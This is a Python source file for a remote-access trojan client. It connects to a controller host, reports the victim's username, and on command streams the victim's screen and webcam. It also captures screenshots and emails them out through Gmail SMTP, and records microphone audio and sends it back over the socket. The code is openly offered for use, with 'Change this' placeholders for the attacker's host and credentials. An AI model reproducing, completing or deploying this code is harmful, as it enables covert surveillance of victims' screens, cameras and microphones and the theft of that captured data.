from PIL import ImageGrab
from vidstream import *
import socket
import getpass
import smtplib
import base64
import os
import platform
import sounddevice
from scipy.io.wavfile import write
import time
from subprocess import Popen, PIPE
import cv2
import numpy as np
import pyautogui

clientHOST = "127.0.0.1" # Change this
clientPORT = 443 # Change this, optional, not recommended
BUFFER_SIZE = 1024
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((clientHOST, clientPORT))
s.send(str(getpass.getuser()).encode("utf-8"))
while True:
    Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
    if Handler_DATA == "screenshare":
        screensharetohost = ScreenShareClient(clientHOST, 4444) # Change this, optional, not recommended
        screensharetohost.start_stream()
    elif Handler_DATA == "webcam_stream":
        webcam = CameraClient(clientHOST, 4444) # Change this, optional, not recommended
        webcam.start_stream()
    elif Handler_DATA == "screenshot":
        screenshot = ImageGrab.grab()
        file = "screenshot.jpg"
        screenshot.save(file)
        f = open('screenshot.jpg', 'rb')
        data=f.read()
        data=base64.b64encode(data)
        f.close()
        os.remove(file)
        smtp = smtplib.SMTP('smtp.gmail.com', 587) # Change this, optional, not recommended
        smtp.starttls()
        smtp.login("yourgmail@gmail.com", "yourpassword") # Change this, reqiured.
        message = data
        smtp.sendmail("yourgmail@gmail.com", "yourgmail@gmail.com", message) # Change this, reqiured.
        smtp.quit()
    elif Handler_DATA == "mic_record":
        frames = 44100
        seconds = 120 # Change this, reqiured.
        channel = 1
        record = sounddevice.rec(int(seconds*frames), samplerate=frames, channels=channel)
        sounddevice.wait()
        write(f"{os.environ['USERPROFILE']}\\\AppData\\Local\\Temp\\aud0.wav", frames, record)
        with open(f"{os.environ['USERPROFILE']}\\\AppData\\Local\\Temp\\aud0.wav", 'rb') as f:
            for l in f: s.sendall(l)
